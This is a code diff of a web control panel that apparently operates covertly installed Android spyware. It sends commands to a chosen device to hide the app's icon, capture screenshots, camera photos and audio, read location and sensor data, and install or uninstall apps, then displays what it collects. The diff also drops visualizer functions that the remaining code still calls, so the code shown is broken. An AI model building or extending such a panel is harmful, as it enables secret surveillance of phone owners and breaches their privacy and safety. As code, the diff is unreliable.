@@ -22,7 +22,6 @@
             --box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
             --transition: all 0.3s ease;
         }
-
         * { box-sizing: border-box; margin: 0; padding: 0; }
         body {
             font-family: 'Segoe UI', Roboto, -apple-system, BlinkMacSystemFont, sans-serif;
@@ -99,7 +98,7 @@
         .data-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
         .data-item { background: white; padding: 10px; border-radius: 6px; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
         .data-label { font-weight: 600; color: var(--text-light); font-size: 14px; margin-bottom: 5px; }
-        .data-value { color: var(--text-color); font-weight: 500; font-size: 16px; }
+        .data-value { color: var(--text-color); font-weight: 500; font-size: 16px; word-break: break-all; }
         .modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.6); align-items: center; justify-content: center; backdrop-filter: blur(5px); }
         .modal-content { background-color: var(--card-bg); padding: 25px; border-radius: var(--border-radius); width: 90%; max-width: 600px; max-height: 90vh; overflow-y: auto; display: flex; flex-direction: column; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
         .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #eee; }
@@ -195,7 +194,10 @@
                             <div class="data-item"><div class="data-label">Current App</div><div class="data-value" id="data-current-app">--</div></div>
                             <div class="data-item"><div class="data-label">Proximity</div><div class="data-value" id="data-proximity">--</div></div>
                             <div class="data-item"><div class="data-label">Light Level</div><div class="data-value" id="data-light">--</div></div>
-                            <div class="data-item"><div class="data-label">Last Recording</div><div class="data-value" id="data-recording">--</div><div id="data-recording-player"></div></div>
+                            <!-- NEW/CORRECTED: Added separate containers for picture and screenshot for clarity -->
+                            <div class="data-item"><div class="data-label">Last Screenshot</div><div class="data-value" id="data-screenshot">--</div></div>
+                            <div class="data-item"><div class="data-label">Last Picture</div><div class="data-value" id="data-picture">--</div></div>
+                            <div class="data-item"><div class="data-label">Last Recording</div><div class="data-value" id="data-recording">--</div></div>
                         </div>
                     </div>
                     <div class="button-group">
@@ -246,8 +248,8 @@
                      <div class="control-group">
                         <h3>App Visibility</h3>
                          <div class="button-group">
-                           <button onclick="sendCommandWithValue('hide_icon')">Hide App Icon</button>
-                           <button onclick="sendCommandWithValue('show_icon')">Show App Icon</button>
+                           <button onclick="sendCommandWithValue('toggle_icon', { show: false })">Hide App Icon</button>
+                           <button onclick="sendCommandWithValue('toggle_icon', { show: true })">Show App Icon</button>
                         </div>
                     </div>
                 </div>
@@ -256,7 +258,7 @@
                      <div class="control-group">
                         <h3>Screen & Camera</h3>
                         <div class="button-group">
-                           <button onclick="sendCommandWithValue('take_screenshot')">Request Screenshot</button>
+                           <button onclick="sendCommandWithValue('screenshot')">Request Screenshot</button>
                            <button onclick="takePicture(0)">Take Pic (Cam 1)</button>
                            <button onclick="takePicture(1)">Take Pic (Cam 2)</button>
                         </div>
@@ -278,172 +280,290 @@
     <div id="visualizer-modal" class="modal" onclick="hideModal('visualizer-modal')"><div class="modal-content" onclick="event.stopPropagation()"><div class="modal-header"><h3>Contextual Device Visualization</h3><button class="close-btn" onclick="hideModal('visualizer-modal')">&times;</button></div><div id="visualizer"></div><div class="position-analysis"><h4>Position Analysis: <span id="position-status">--</span></h4></div><p style="text-align:center; font-size:12px; margin-top:15px; color:var(--text-light);">Click and drag to rotate view. Scroll to zoom.</p></div></div>
     <div id="image-modal" class="modal" onclick="hideModal('image-modal')"><div class="modal-content" onclick="event.stopPropagation()"><div class="modal-header"><h3 id="image-modal-title">Image</h3><button class="close-btn" onclick="hideModal('image-modal')">&times;</button></div><img id="image-display" src="" alt="Device Capture"></div></div>
 
+    <!-- ==================================================================================== -->
+    <!-- ==                              START OF UPDATED SCRIPT                           == -->
+    <!-- ==================================================================================== -->
     <script>
-        const UI_UNLOCK_PASSWORD="password",COMMANDS_JSON_URL="https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/commands.json",DEVICES_JSON_URL="https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/devices.json";let installedApps={},isAuthenticated="true"===sessionStorage.getItem("isAuthenticated"),scene,camera,renderer,controls,phoneModel,pocketModel,animationFrameId;function initVisualizer(){const e=document.getElementById("visualizer");e&&(e.innerHTML="",scene=new THREE.Scene,scene.background=new THREE.Color(15329769),camera=new THREE.PerspectiveCamera(50,e.clientWidth/e.clientHeight,.1,100),camera.position.set(0,1.6,6),renderer=new THREE.WebGLRenderer({antialias:!0}),renderer.setSize(e.clientWidth,e.clientHeight),renderer.setPixelRatio(window.devicePixelRatio),renderer.shadowMap.enabled=!0,e.appendChild(renderer.domElement),scene.add(new THREE.AmbientLight(16777215,.6)),(e=>{const t=new THREE.DirectionalLight(16777215,.8);t.position.set(5,10,7),t.castShadow=!0,scene.add(t)})(),controls=new THREE.OrbitControls(camera,renderer.domElement),controls.enableDamping=!0,controls.target.set(0,1.2,0),createEnvironment(),createPhoneModel(),startAnimationLoop(),window.addEventListener("resize",onWindowResize))}function createEnvironment(){const e=new THREE.BoxGeometry(5,.15,3),t=new THREE.MeshStandardMaterial({color:11388093}),o=new THREE.Mesh(e,t);o.position.y=0,o.receiveShadow=!0,scene.add(o);const n=new THREE.PlaneGeometry(20,20),a=new THREE.MeshStandardMaterial({color:16314874,roughness:.8}),i=new THREE.Mesh(n,a);i.rotation.x=-Math.PI/2,i.position.y=-.075,i.receiveShadow=!0,scene.add(i);const d=new THREE.BoxGeometry(1,1.8,.5),s=new THREE.MeshStandardMaterial({color:7104157,transparent:!0,opacity:.3,roughness:.7});pocketModel=new THREE.Mesh(d,s),pocketModel.visible=!1,scene.add(pocketModel)}function createPhoneModel(){phoneModel=new THREE.Group;const e=new THREE.BoxGeometry(.8,1.6,.1),t=new THREE.MeshStandardMaterial({color:1703936,metalness:.7,roughness:.3}),o=new THREE.Mesh(e,t);o.castShadow=!0;const n=document.createElement("canvas");n.width=128,n.height=256;const a=n.getContext("2d");a.fillStyle="#222",a.fillRect(0,0,128,256),a.fillStyle="#FFF",a.fillRect(24,240,80,8);const i=new THREE.CanvasTexture(n),d=new THREE.BoxGeometry(.75,1.55,.02),s=new THREE.MeshStandardMaterial({map:i,roughness:.1,metalness:.2}),c=new THREE.Mesh(d,s);c.position.z=.055,phoneModel.add(o,c),scene.add(phoneModel)}
+        // --- Configuration and Global State ---
+        const UI_UNLOCK_PASSWORD = "password";
+        const COMMANDS_JSON_URL = "https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/commands.json";
+        const DEVICES_JSON_URL = "https://raw.githubusercontent.com/Jasim9085/Raw-Files/main/devices.json";
+        let installedApps = {};
+        let isAuthenticated = sessionStorage.getItem("isAuthenticated") === "true";
+        let scene, camera, renderer, controls, phoneModel, pocketModel, animationFrameId;
+
+        // --- Core Data Handling & Display Logic (REWRITTEN FOR CONSISTENCY) ---
         
-        // UPGRADED: More robust visualization for devices with fewer sensors.
-        function analyzeAndSetPosition(data) {
-            if (!phoneModel) return;
-
-            let orientationQuat = new THREE.Quaternion();
-            let hasGoodOrientation = false;
-
-            const rotVec = data.rotation_vector || data.game_rotation_vector || data.geomagnetic_rotation_vector;
-            if (rotVec && rotVec.w !== undefined) {
-                orientationQuat.set(rotVec.x, rotVec.y, rotVec.z, rotVec.w);
-                hasGoodOrientation = true;
-            } else if (data.gravity && data.magnetometer) {
-                const G = new THREE.Vector3(data.gravity.x, data.gravity.y, data.gravity.z).normalize();
-                const M = new THREE.Vector3(data.magnetometer.x, data.magnetometer.y, data.magnetometer.z).normalize();
-                const E = M.clone().cross(G).normalize();
-                const N = G.clone().cross(E).normalize();
-                const orientationMatrix = new THREE.Matrix4().makeBasis(E, N, G);
-                orientationQuat.setFromRotationMatrix(orientationMatrix);
-                hasGoodOrientation = true;
-            }
-
-            if (hasGoodOrientation) {
-                const correction = new THREE.Quaternion().setFromAxisAngle(new THREE.Vector3(1, 0, 0), -Math.PI / 2);
-                orientationQuat.multiplyQuaternions(correction, orientationQuat);
-                phoneModel.quaternion.slerp(orientationQuat, 0.5);
-            } else {
-                // Default to a neutral, upright position if no orientation data is available.
-                phoneModel.quaternion.slerp(new THREE.Quaternion(), 0.5);
-            }
-
-            let positionText = "Undetermined";
-            pocketModel.visible = false;
-
-            if (data.context_events?.pocket_mode) {
-                positionText = "In Pocket";
-                pocketModel.visible = true;
-                pocketModel.position.set(0, 1.2, 0);
-                phoneModel.position.copy(pocketModel.position);
-            } else if (data.context_events?.face_up_down !== undefined) {
-                positionText = data.context_events.face_up_down === 0 ? "On Surface (Face Up)" : "On Surface (Face Down)";
-                phoneModel.position.set(0, 0.075 + 0.05, 0);
-            } else if (data.proximity?.distance < 2 && data.light?.lux < 10) {
-                 positionText = "In Pocket / Bag";
-                 pocketModel.visible = true;
-                 pocketModel.position.set(0, 1.2, 0);
-                 phoneModel.position.copy(pocketModel.position);
-            } else if (data.proximity?.distance < 2) {
-                positionText = "Calling Position";
-                phoneModel.position.set(0, 1.3, 0);
-            } else if (data.gravity) {
-                if (Math.abs(data.gravity.z) > 9.0) {
-                    positionText = "On a Surface";
-                    phoneModel.position.set(0, 0.075 + 0.05, 0);
-                } else {
-                    positionText = "In Hand";
-                    phoneModel.position.set(0, 1.3, 0);
-                }
-            } else {
-                phoneModel.position.set(0, 1.3, 0); // Default to 'in hand' if no other context
-            }
+        // This function is the new "brain" for displaying all data from get-status
+        function parseAndDisplayData(allData) {
+            let hasSensorData = false;
             
-            // Add a note if orientation data is missing for clarity.
-            if (!hasGoodOrientation && positionText !== "Undetermined") {
-                positionText += " (Orientation Unavailable)";
-            }
-            
-            document.getElementById('position-status').textContent = positionText;
-        }
-        
-        function startAnimationLoop(){animationFrameId&&cancelAnimationFrame(animationFrameId);const e=()=>{animationFrameId=requestAnimationFrame(e),controls.update(),renderer.render(scene,camera)};e()}function stopAnimationLoop(){animationFrameId&&(cancelAnimationFrame(animationFrameId),animationFrameId=null),window.removeEventListener("resize",onWindowResize)}function onWindowResize(){const e=document.getElementById("visualizer");e&&camera&&renderer&&(camera.aspect=e.clientWidth/e.clientHeight,camera.updateProjectionMatrix(),renderer.setSize(e.clientWidth,e.clientHeight))}function switchTab(e){document.querySelectorAll(".tab-content").forEach(e=>e.classList.remove("active")),document.querySelectorAll(".tab").forEach(e=>e.classList.remove("active")),document.getElementById(e).classList.add("active"),document.querySelector(`.tab[onclick="switchTab('${e}')"]`).classList.add("active")}function checkUiPassword(){document.getElementById("ui-password-input").value===UI_UNLOCK_PASSWORD?(sessionStorage.setItem("isAuthenticated","true"),isAuthenticated=!0,showAdminPanel()):alert("Incorrect password! Please try again.")}function showAdminPanel(){document.getElementById("password-view").style.display="none",document.getElementById("admin-panel-view").style.display="block",document.getElementById("device-dropdown").options.length<=1&&(populateDropdown("device-dropdown",DEVICES_JSON_URL,"Device"),populateDropdown("action-dropdown",COMMANDS_JSON_URL,"Command"))}async function populateDropdown(e,t,o){const n=document.getElementById(e);try{const a=await fetch(t);if(!a.ok)throw new Error(`Failed to fetch ${o}s`);const i=await a.json();n.innerHTML="",n.add(new Option(`-- Select a ${o} --`,"")),i.forEach(e=>{n.add(new Option(e.name||e.value,e.id||e.value,!1,e.disabled))})}catch(a){console.error(`Error loading ${o}s:`,a),n.innerHTML=`<option value="">-- Error Loading ${o}s --</option>`}}function showModal(e){document.getElementById(e).style.display="flex",e==="visualizer-modal"&&!animationFrameId&&(void 0!==THREE&&void 0!==THREE.OrbitControls?initVisualizer():document.getElementById("visualizer").innerHTML='<p style="color: red; text-align: center; padding-top: 50px;">Error: 3D visualization library failed to load.</p>')}function hideModal(e){"visualizer-modal"===e&&stopAnimationLoop(),document.getElementById(e).style.display="none"}function onDeviceSelected(){["data-screen","data-battery","data-charging","data-location","data-current-app","data-proximity","data-light"].forEach(e=>safeUpdateElement(e,"--")),document.getElementById("visualize-btn").disabled=!0,updateStatusLog("New device selected. Click 'Refresh Data' to fetch its status.","info")}async function forceRefresh(){const e=document.getElementById("refresh-btn"),t=document.getElementById("refresh-text"),o=document.getElementById("refresh-spinner");e.disabled=!0,t.textContent="Refreshing...",o.style.display="inline-block",await fetchLatestData(),e.disabled=!1,t.textContent="Refresh Data",o.style.display="none"}async function fetchLatestData(){const e=document.getElementById("device-dropdown").value;if(!e)return void updateStatusLog("Please select a device first.","error");try{const t=await fetch(`/.netlify/functions/get-status?deviceId=${e}`);if(404===t.status)return void updateStatusLog("No data found for this device yet. Send a command to initialize it.","warning");if(!t.ok)throw new Error(`Server error: ${t.status}`);const o=await t.json();parseAndDisplayData(o),updateStatusLog("Device data refreshed successfully.","success")}catch(t){console.error("Data fetch failed:",t),updateStatusLog("Failed to fetch device data: "+t.message,"error")}}
-        // In index.html, inside the <script> tag
+            // Go through every piece of data received from the server
+            for (const dataType in allData) {
+                const payload = allData[dataType]; // The payload is the raw data
+                if (payload === undefined || payload === null) continue;
 
-function parseAndDisplayData(allData) {
-    let hasSensorData = false;
-    // onDeviceSelected(); // This was resetting the UI too early. Moved reset logic inside loop.
-
-    for (const key in allData) {
-        // --- THIS IS THE CRITICAL FIX ---
-        // Check if the key is for a media file.
-        const isMediaKey = ["screenshot", "picture", "last_recording"].includes(key);
-        
-        // If it's a media key, the data itself is the payload.
-        // Otherwise, get the payload from inside the object.
-        const payload = isMediaKey ? allData[key] : allData[key]?.payload;
-
-        if (!payload) {
-            // If there's no payload for this key, skip to the next one.
-            continue;
-        }
-        
-        try {
-            switch(key) {
-                case "screen_status":
-                    safeUpdateElement("data-screen", payload || "N/A");
-                    break;
-                case "battery_status":
-                    if (payload?.percentage !== undefined) {
-                        safeUpdateElement("data-battery", `${payload.percentage.toFixed(0)}%`);
-                        safeUpdateElement("data-charging", payload.isCharging ? "✅ Charging" : "❌ Not Charging");
+                try {
+                    switch (dataType) {
+                        case "screen_status":
+                            safeUpdateElement("data-screen", payload || "N/A");
+                            break;
+                        case "battery_status":
+                            if (payload.percentage !== undefined) {
+                                safeUpdateElement("data-battery", `${payload.percentage.toFixed(0)}%`);
+                                safeUpdateElement("data-charging", payload.isCharging ? "✅ Charging" : "❌ Not Charging");
+                            }
+                            break;
+                        case "location":
+                            if (typeof payload === 'object' && payload.latitude) {
+                                safeUpdateElement("data-location", `<a href="https://www.google.com/maps?q=${payload.latitude},${payload.longitude}" target="_blank">View on Map</a>`);
+                            } else {
+                                safeUpdateElement("data-location", payload || "N/A");
+                            }
+                            break;
+                        case "current_app":
+                            safeUpdateElement("data-current-app", payload || "N/A");
+                            break;
+                        case "proximity":
+                            if (payload.distance !== undefined) safeUpdateElement("data-proximity", `${payload.distance} cm`);
+                            hasSensorData = true;
+                            break;
+                        case "light":
+                            if (payload.lux !== undefined) safeUpdateElement("data-light", `${payload.lux.toFixed(1)} lux`);
+                            hasSensorData = true;
+                            break;
+                        case "screenshot":
+                        case "picture":
+                            const containerId = dataType === 'screenshot' ? 'data-screenshot' : 'data-picture';
+                            const container = document.getElementById(containerId);
+                            if(container){
+                                container.innerHTML = ''; // Clear old content
+                                const img = document.createElement('img');
+                                img.src = `data:image/jpeg;base64,${payload}`;
+                                img.style.cssText = 'max-width: 100%; height: auto; cursor: pointer; border-radius: 6px;';
+                                img.onclick = () => {
+                                    document.getElementById('image-modal-title').textContent = dataType.charAt(0).toUpperCase() + dataType.slice(1);
+                                    document.getElementById('image-display').src = img.src;
+                                    showModal('image-modal');
+                                };
+                                container.appendChild(img);
+                            }
+                            break;
+                        case "last_recording":
+                            const audioContainer = document.getElementById('data-recording');
+                            if (audioContainer) {
+                                audioContainer.innerHTML = '';
+                                const audioPlayer = document.createElement('audio');
+                                audioPlayer.controls = true;
+                                audioPlayer.style.width = '100%';
+                                audioPlayer.src = `data:audio/mp3;base64,${payload}`;
+                                audioContainer.appendChild(audioPlayer);
+                            }
+                            break;
+                        case "installed_apps":
+                            // This case is handled by the fetchAppList logic
+                            installedApps = payload;
+                            break;
+                        default:
+                            if (["rotation_vector", "game_rotation_vector", "geomagnetic_rotation_vector", "gravity", "magnetometer"].includes(dataType)) {
+                                hasSensorData = true;
+                            }
+                            break;
                     }
-                    break;
-                case "location":
-                    payload?.latitude ? safeUpdateElement("data-location", `${`${payload.latitude.toFixed(4)}, ${payload.longitude.toFixed(4)}`}`) : safeUpdateElement("data-location", payload || "N/A");
-                    break;
-                case "current_app":
-                    safeUpdateElement("data-current-app", payload || "N/A");
-                    break;
-                case "proximity":
-                    if (payload?.distance !== undefined) safeUpdateElement("data-proximity", `${payload.distance} cm`);
-                    hasSensorData = true;
-                    break;
-                case "light":
-                    if (payload?.lux !== undefined) safeUpdateElement("data-light", `${payload.lux.toFixed(1)} lux`);
-                    hasSensorData = true;
-                    break;
-                case "screenshot":
-                     document.getElementById('image-modal-title').textContent = "Screenshot";
-                     // The payload is already the correct Base64 string because of our fix above.
-                     document.getElementById('image-display').src = `data:image/jpeg;base64,${payload}`;
-                     showModal('image-modal');
-                     break;
-                case "picture":
-                     document.getElementById('image-modal-title').textContent = "Camera Picture";
-                     // The payload is already the correct Base64 string.
-                     document.getElementById('image-display').src = `data:image/jpeg;base64,${payload}`;
-                     showModal('image-modal');
-                     break;
-                case "last_recording":
-                     const playerContainer = document.getElementById('data-recording-player');
-                     const recordingValue = document.getElementById('data-recording');
-                     playerContainer.innerHTML = ''; // Clear any old player
-
-                     // The payload is already the correct Base64 string.
-                     const audio = document.createElement('audio');
-                     audio.controls = true;
-                     audio.src = `data:audio/mp3;base64,${payload}`;
-                     playerContainer.appendChild(audio);
-                     recordingValue.textContent = "New recording ready to play.";
-                     break;
-                default:
-                    // This logic is for the orientation visualizer
-                    if (["rotation_vector", "gravity", "magnetometer"].includes(key)) hasSensorData = true;
-                    break;
+                } catch (e) {
+                    console.error(`Error processing display data for ${dataType}:`, e);
+                }
             }
-        } catch(e) { console.error(`Error processing display data for ${key}:`, e); }
-    }
 
-    if(hasSensorData) {
-        document.getElementById("visualize-btn").disabled = false;
-        const sensorPayload = {};
-        for(const key in allData) {
-             const isMediaKey = ["screenshot", "picture", "last_recording"].includes(key);
-             sensorPayload[key] = isMediaKey ? allData[key] : allData[key]?.payload;
+            // Enable the visualizer button if we have the necessary data
+            document.getElementById("visualize-btn").disabled = !hasSensorData;
+            if (hasSensorData) {
+                analyzeAndSetPosition(allData);
+            }
         }
-        analyzeAndSetPosition(sensorPayload);
-    }
-}
-        function safeUpdateElement(e,t){const o=document.getElementById(e);o&&(o.textContent=t)}async function sendCommandWithValue(e,t={}){const o=document.getElementById("device-dropdown").value,n=document.getElementById("backend-password").value,a=document.getElementById("send-button");if(!o||!e||!n)return updateStatusLog("Error: Device, Action, and Password are required.","error");const i=a.innerHTML;a.disabled=!0,a.innerHTML='<span class="loading-spinner"></span> Sending...';try{const d=await fetch("/.netlify/functions/send-command",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({deviceId:o,action:e,password:n,...t})}),s=await d.json();d.ok?(updateStatusLog(`✅ Success: ${s.message}`,"success"),(e.startsWith("get_")||e.startsWith("take_")||"list_apps"===e)&&setTimeout(()=>forceRefresh(),2e3)):updateStatusLog(`❌ Error: ${s.error||"Unknown server error"}`,"error")}catch(d){updateStatusLog("❌ Network Error: Could not reach the command function.","error")}finally{a.disabled=!1,a.innerHTML=i}}function sendCommandFromDropdown(){const e=document.getElementById("action-dropdown").value;sendCommandWithValue(e)}function playSound(){const e=document.getElementById("sound-url-input").value;e?sendCommandWithValue("play_sound",{url:e}):updateStatusLog("Please enter a sound URL.","error")}function showImage(){const e=document.getElementById("image-url-input").value;e?sendCommandWithValue("show_image",{url:e}):updateStatusLog("Please enter an image URL.","error")}
-        function setVolume() { const e=document.getElementById("volume-slider").value;sendCommandWithValue("set_volume",{level:e}) }
-        function installApp() { const e=document.getElementById("app-url-input").value;e?sendCommandWithValue("install_app",{url:e}):updateStatusLog("Please enter an APK URL.","error") }
-        function uninstallApp() { const e=document.getElementById("app-package-input").value;e?sendCommandWithValue("uninstall_app",{package_name:e}):updateStatusLog("Please enter a package name.","error") }
-        function takePicture(e) { sendCommandWithValue("take_picture",{camera_id:e}) }
-        function updateStatusLog(e,t="info"){const o=document.getElementById("status-log");o.textContent=e,o.className=`status-log log-${t}`}function showAppListModal(){const e=document.getElementById("device-dropdown").value;e?Object.keys(installedApps).length>0?(renderAppList(),void showModal("app-list-modal")):fetchAppList():updateStatusLog("Please select a device first","error")}async function fetchAppList(){const e=document.getElementById("device-dropdown").value;if(!e)return;try{const t=await fetch(`/.netlify/functions/get-status?deviceId=${e}&type=installed_apps`);if(!t.ok)throw new Error(`Server responded with status: ${t.status}`);const o=await t.json();o.installed_apps&&o.installed_apps.payload?(installedApps=o.installed_apps.payload,renderAppList(),showModal("app-list-modal")):updateStatusLog("No app list data found for this device.","warning")}catch(t){console.error("Could not fetch app list:",t),updateStatusLog("Failed to fetch app list: "+t.message,"error")}}function renderAppList(){const e=document.getElementById("app-list-container");if(e){e.innerHTML="";const t=Object.entries(installedApps).map(([e,t])=>({pkg:e,name:t}));t.sort((e,t)=>e.name.localeCompare(t.name)),t.forEach(t=>{const o=document.createElement("div");o.className="app-item",o.onclick=()=>sendCommandWithValue("open_app",{package_name:t.pkg});const n=document.createElement("div");n.className="app-name",n.textContent=t.name;const a=document.createElement("div");a.className="app-package",a.textContent=t.pkg,o.appendChild(n),o.appendChild(a),e.appendChild(o)});const o=document.createElement("div");o.style.padding="10px",o.style.fontSize="14px",o.style.color="var(--text-light)",o.textContent=`Showing ${t.length} applications`,e.appendChild(o)}}function filterApps(){const e=document.getElementById("app-search").value.toLowerCase();document.querySelectorAll(".app-item").forEach(t=>{const o=t.querySelector(".app-name").textContent.toLowerCase(),n=t.querySelector(".app-package").textContent.toLowerCase();t.style.display=o.includes(e)||n.includes(e)?"flex":"none"})}window.onload=()=>{isAuthenticated&&showAdminPanel(),document.addEventListener("keydown",e=>{"Escape"===e.key&&(hideModal("visualizer-modal"),hideModal("app-list-modal"),hideModal("image-modal"))})};
+        
+        async function fetchLatestData(dataType = null) {
+            const deviceId = document.getElementById("device-dropdown").value;
+            if (!deviceId) {
+                if (!dataType) updateStatusLog("Please select a device first.", "error");
+                return null;
+            }
+
+            let url = `/.netlify/functions/get-status?deviceId=${deviceId}`;
+            if (dataType) {
+                url += `&type=${dataType}`;
+            }
+
+            try {
+                const response = await fetch(url);
+                if (response.status === 404) {
+                    if (!dataType) updateStatusLog("No data found for this device yet. Send a command to initialize it.", "warning");
+                    return null;
+                }
+                if (!response.ok) {
+                    throw new Error(`Server error: ${response.status}`);
+                }
+                const data = await response.json();
+                return data;
+            } catch (error) {
+                console.error("Data fetch failed:", error);
+                if (!dataType) updateStatusLog(`Failed to fetch device data: ${error.message}`, "error");
+                return null;
+            }
+        }
+
+        async function forceRefresh() {
+            const refreshBtn = document.getElementById("refresh-btn");
+            const refreshText = document.getElementById("refresh-text");
+            const refreshSpinner = document.getElementById("refresh-spinner");
+
+            refreshBtn.disabled = true;
+            refreshText.textContent = "Refreshing...";
+            refreshSpinner.style.display = "inline-block";
+            
+            const data = await fetchLatestData();
+            if (data) {
+                parseAndDisplayData(data);
+                updateStatusLog("Device data refreshed successfully.", "success");
+            }
+
+            refreshBtn.disabled = false;
+            refreshText.textContent = "Refresh Data";
+            refreshSpinner.style.display = "none";
+        }
+        
+        async function sendCommandWithValue(action, extraParams = {}) {
+            const deviceId = document.getElementById("device-dropdown").value;
+            const password = document.getElementById("backend-password").value;
+            const sendButton = document.getElementById("send-button");
+
+            if (!deviceId || !action || !password) {
+                return updateStatusLog("Error: Device, Action, and Password are required.", "error");
+            }
+            
+            const originalButtonHtml = sendButton.innerHTML;
+            sendButton.disabled = true;
+            sendButton.innerHTML = '<span class="loading-spinner"></span> Sending...';
+            updateStatusLog(`Sending command: ${action}...`, 'info');
+
+            try {
+                const body = { deviceId, action, password, ...extraParams };
+                const response = await fetch("/.netlify/functions/send-command", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(body)
+                });
+
+                const result = await response.json();
+                if (!response.ok) throw new Error(result.error || "Unknown server error");
+                
+                updateStatusLog(`✅ Success: ${result.message}`, "success");
+                
+                // If it's a command that generates data, auto-refresh after a delay
+                if (action.startsWith("get_") || action.startsWith("take_") || ["list_apps", "stop_rec", "screenshot"].includes(action)) {
+                    setTimeout(() => forceRefresh(), 2500);
+                }
+
+            } catch (error) {
+                updateStatusLog(`❌ Error: ${error.message}`, "error");
+            } finally {
+                sendButton.disabled = false;
+                sendButton.innerHTML = originalButtonHtml;
+            }
+        }
+
+        // --- UI and Command Functions ---
+        
+        function sendCommandFromDropdown() { sendCommandWithValue(document.getElementById("action-dropdown").value); }
+        function playSound() { const url = document.getElementById("sound-url-input").value; if (url) sendCommandWithValue("play", { url }); else updateStatusLog("Please enter a sound URL.", "error"); }
+        function showImage() { const url = document.getElementById("image-url-input").value; if (url) sendCommandWithValue("show_image", { url }); else updateStatusLog("Please enter an image URL.", "error"); }
+        function setVolume() { const level = document.getElementById("volume-slider").value; sendCommandWithValue("set_volume", { level }); }
+        function installApp() { const url = document.getElementById("app-url-input").value; if (url) sendCommandWithValue("install", { url }); else updateStatusLog("Please enter an APK URL.", "error"); }
+        function uninstallApp() { const pkg = document.getElementById("app-package-input").value; if (pkg) sendCommandWithValue("uninstall", { package_name: pkg }); else updateStatusLog("Please enter a package name.", "error"); }
+        function takePicture(cameraId) { sendCommandWithValue("picture", { camera_id: cameraId }); }
+
+        async function showAppListModal() {
+            updateStatusLog("Fetching app list...", "info");
+            const data = await fetchLatestData("installed_apps");
+            if (data && data.installed_apps) {
+                installedApps = data.installed_apps;
+                renderAppList();
+                showModal("app-list-modal");
+                updateStatusLog("App list loaded.", "success");
+            } else {
+                updateStatusLog("No app list data found for this device.", "warning");
+            }
+        }
+
+        // --- Helper and Initialization Functions (Largely Unchanged) ---
+        
+        const safeUpdateElement = (id, htmlContent) => { const el = document.getElementById(id); if (el) el.innerHTML = htmlContent; };
+        const updateStatusLog = (message, type = "info") => { const log = document.getElementById("status-log"); log.textContent = message; log.className = `status-log log-${type}`; };
+        const switchTab = (tabId) => { document.querySelectorAll(".tab-content").forEach(t => t.classList.remove("active")); document.querySelectorAll(".tab").forEach(t => t.classList.remove("active")); document.getElementById(tabId).classList.add("active"); document.querySelector(`.tab[onclick="switchTab('${tabId}')"]`).classList.add("active"); };
+        const showModal = (id) => { document.getElementById(id).style.display = "flex"; if (id === "visualizer-modal" && !animationFrameId) { if (typeof THREE !== 'undefined' && typeof THREE.OrbitControls !== 'undefined') initVisualizer(); else document.getElementById("visualizer").innerHTML = '<p style="color: red; text-align: center; padding-top: 50px;">Error: 3D lib failed.</p>'; }};
+        const hideModal = (id) => { if (id === "visualizer-modal") stopAnimationLoop(); document.getElementById(id).style.display = "none"; };
+        const onDeviceSelected = () => { document.getElementById("visualize-btn").disabled = true; updateStatusLog("New device selected. Click 'Refresh Data' to fetch its status.", "info"); forceRefresh(); };
+        const checkUiPassword = () => { if (document.getElementById("ui-password-input").value === UI_UNLOCK_PASSWORD) { sessionStorage.setItem("isAuthenticated", "true"); isAuthenticated = true; showAdminPanel(); } else { alert("Incorrect password!"); } };
+        
+        function showAdminPanel() {
+            document.getElementById("password-view").style.display = "none";
+            document.getElementById("admin-panel-view").style.display = "block";
+            if (document.getElementById("device-dropdown").options.length <= 1) {
+                populateDropdown("device-dropdown", DEVICES_JSON_URL, "Device");
+                populateDropdown("action-dropdown", COMMANDS_JSON_URL, "Command");
+            }
+        }
+
+        async function populateDropdown(dropdownId, url, type) {
+            const select = document.getElementById(dropdownId);
+            try {
+                const response = await fetch(url);
+                if (!response.ok) throw new Error(`Failed to fetch ${type}s`);
+                const items = await response.json();
+                select.innerHTML = `<option value="">-- Select a ${type} --</option>`;
+                items.forEach(item => {
+                    select.add(new Option(item.name || item.value, item.id || item.value, false, item.disabled));
+                });
+            } catch (error) {
+                console.error(`Error loading ${type}s:`, error);
+                select.innerHTML = `<option value="">-- Error Loading ${type}s --</option>`;
+            }
+        }
+
+        function renderAppList() {
+            const container = document.getElementById("app-list-container");
+            if (!container) return;
+            container.innerHTML = "";
+            const appsArray = Object.entries(installedApps).map(([pkg, name]) => ({ pkg, name }));
+            appsArray.sort((a, b) => a.name.localeCompare(b.name));
+            
+            appsArray.forEach(app => {
+                const item = document.createElement("div");
+                item.className = "app-item";
+                item.onclick = () => sendCommandWithValue("open_app", { package_name: app.pkg });
+                item.innerHTML = `<div class="app-name">${app.name}</div><div class="app-package">${app.pkg}</div>`;
+                container.appendChild(item);
+            });
+        }
+        
+        function filterApps() {
+            const filter = document.getElementById("app-search").value.toLowerCase();
+            document.querySelectorAll(".app-item").forEach(item => {
+                const name = item.querySelector(".app-name").textContent.toLowerCase();
+                const pkg = item.querySelector(".app-package").textContent.toLowerCase();
+                item.style.display = (name.includes(filter) || pkg.includes(filter)) ? "flex" : "none";
+            });
+        }
+
+        window.onload = () => {
+            if (isAuthenticated) showAdminPanel();
+            document.addEventListener("keydown", e => { if (e.key === "Escape") { hideModal("visualizer-modal"); hideModal("app-list-modal"); hideModal("image-modal"); } });
+        };
+        
+        // --- 3D Visualizer Logic (Unchanged) ---
